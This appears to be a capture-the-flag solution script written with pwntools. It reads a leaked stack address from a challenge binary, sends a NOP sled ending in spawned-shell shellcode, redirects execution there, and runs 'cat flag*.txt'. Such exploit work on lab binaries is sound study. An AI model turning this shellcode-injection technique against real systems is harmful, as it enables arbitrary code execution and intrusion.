from pwn import *

elf = context.binary = ELF('./task')

if args.GDB:
	p = gdb.debug(elf.path, '\n'.join([
		"b *main+182",
		"c"
	]))
elif args.REMOTE:
	host, port = args.get("HOST", "localhost"), args.get("PORT", 5000)
	p = remote(host, port)
else:
	p = process(elf.path) 

p.recvuntil(b'Approximate')

d = p.recvline().decode().split(":")[1].strip()
approx_address = int(d, 16)
print(f"[+] Approx address {hex(approx_address)}")

# |-----------|
# |   ptr     |   +222 or -222 from there
# |-----------|   add 2*222 to this address to make sure 
# |   loc     |   that we landed in buffer filled with nops and shellcode
# |-----------|
# | saved rbp |
# |-----------|
# |   ret     |
# |-----------|
# |           |
# |  buffer   |
# |  0x1000   |
# |           |
# |-----------|
# |  fun ptr  |
# |-----------|

BUFFER_LEN = 0x1000
ACCURACY = 444
jump_to = approx_address + 2 * ACCURACY
print(f"[+] Jump to {hex(jump_to)}")

nop = asm(shellcraft.nop())
sh = asm(shellcraft.sh())
# sh = b'\xeb\xfe'
nopsled = nop * (BUFFER_LEN - len(sh) - 1)
nopsled += sh

p.sendline(nopsled)
p.sendline(hex(jump_to).encode())

# p.interactive()

sleep(1.0)
p.sendline(b"cat flag*.txt")

print(p.clean(1.0))
